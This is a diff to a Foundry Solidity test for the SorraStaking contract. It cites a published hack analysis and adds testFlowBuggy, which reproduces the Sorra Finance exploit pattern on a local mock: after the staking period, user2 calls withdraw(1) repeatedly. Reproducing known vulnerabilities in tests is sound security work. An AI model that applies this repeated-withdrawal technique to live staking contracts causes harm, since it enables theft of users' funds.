@@ -5,6 +5,7 @@ import {Test, console2} from "forge-std/Test.sol";
 import {sorraStaking as SorraStaking} from "../../src/sorra/SorraStaking.sol";
 import {MockERC20} from "../MockERC20.sol";
 
+// origin: https://www.quillaudits.com/blog/hack-analysis/sorra-finance-hack-smart-contract-exploit
 contract SorraTest is Test {
     SorraStaking sorraStaking;
     MockERC20 rewardToken;
@@ -40,6 +41,28 @@ contract SorraTest is Test {
 
         vm.prank(user);
         sorraStaking.withdraw(100 ether);
+
+        debug();
+    }
+
+    function testFlowBuggy() public {
+        // user stakes for tier 0 (14 days)
+        vm.prank(user);
+        sorraStaking.deposit(100 ether, 0);
+
+        // user2 stakes for tier 0 (14 days)
+        vm.prank(user2);
+        sorraStaking.deposit(100 ether, 0);
+
+        skip(14 days + 1);
+
+        debug();
+
+        vm.prank(user2);
+        sorraStaking.withdraw(1);
+
+        vm.prank(user2);
+        sorraStaking.withdraw(1);
 
         debug();
     }
